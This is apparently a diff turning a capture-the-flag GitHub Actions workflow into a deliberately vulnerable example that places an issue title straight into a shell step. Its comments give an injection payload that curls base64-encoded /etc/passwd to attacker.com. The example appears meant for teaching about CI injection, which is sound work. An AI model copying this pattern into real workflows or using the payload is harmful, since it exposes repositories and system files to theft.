@@ -1,13 +1,14 @@
-name: Challenge 1
+name: Vulnerable Workflow
 on:
   issues:
     types: [opened]
 jobs:
-  challenge1:
+  vulnerable_job:
     runs-on: ubuntu-latest
     steps:
-      - name: Challenge 1
+      - name: Vulnerable Step
         run: |
-          echo "The flag is in a file called flag.txt"
-          echo "flag{this_is_the_flag}" > flag.txt
-          echo "Your input: ${{ github.event.issue.title }}"
+          # The following line is vulnerable to command injection.
+          # An attacker can create an issue with a title like:
+          # '; curl http://attacker.com/$(cat /etc/passwd | base64)'
+          echo "Running command with issue title: ${{ github.event.issue.title }}"
